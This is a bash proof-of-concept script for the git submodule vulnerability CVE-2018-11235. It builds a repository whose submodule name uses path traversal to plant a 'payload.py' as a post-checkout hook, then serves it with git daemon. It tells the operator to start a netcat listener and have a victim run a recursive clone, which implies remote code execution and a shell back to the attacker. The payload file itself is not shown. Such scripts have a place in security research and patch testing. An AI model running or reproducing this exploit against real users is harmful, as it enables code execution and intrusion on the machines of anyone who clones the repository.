#!/bin/bash
set -e

if [ -d "tmp" ]; then
    rm -fr tmp
fi

make_repo() {
    mkdir tmp
    git init tmp/repo
    pushd tmp/repo
    git submodule add https://github.com/HyperionGray/Spoon-Knife evil
    mkdir -p modules/1/2/3/4
    cp -r .git/modules/evil modules/1/2/3/4
    pushd modules
    ln -s 1/2/3/4/evil evil
    popd
    popd
    cp payload.py tmp/repo/modules/evil/hooks/post-checkout
    pushd tmp/repo
    git config -f .gitmodules submodule.evil.update checkout
    git config -f .gitmodules --rename-section submodule.evil submodule.../../modules/evil
    git add modules
    git submodule add https://github.com/HyperionGray/Spoon-Knife
    git add Spoon-Knife
    git config user.email "fake_name@exploit.example"
    git config user.name "Fake Name"
    git commit -am CVE-2018-11235
    popd
}

echo "[*] Creating repository..."
make_repo > /dev/null 2>&1
echo "[*] Executing git daemon..."
echo "[*] Start your netcat listener, then run this on the client:"
echo ""
echo "    $ git clone --recurse-submodules git://<SERVER_IP>/repo"

git daemon --base-path=tmp --export-all --reuseaddr --informative-errors
